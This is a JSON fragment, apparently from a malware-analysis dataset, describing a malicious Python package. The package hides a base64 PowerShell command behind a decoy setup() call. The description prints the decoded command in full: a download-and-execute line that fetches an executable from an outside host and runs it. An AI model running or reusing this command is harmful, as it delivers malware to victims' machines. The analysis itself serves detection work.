      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded command decodes to: 'Invoke-WebRequest -Uri \"https://esqueleslt.000webhostapp.com/xEsquelesquad.exe\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This downloads and executes a Windows executable from a remote server, which is a classic method for delivering and running malware on a victim's machine. The use of subprocess.Popen with hidden window flags and obfuscated parameters further indicates an attempt to evade detection. The rest of the code is a decoy setup() call to appear as a legitimate Python package. This code can compromise the system by running arbitrary code from the internet, potentially leading to data theft, system compromise, or further malware installation.",
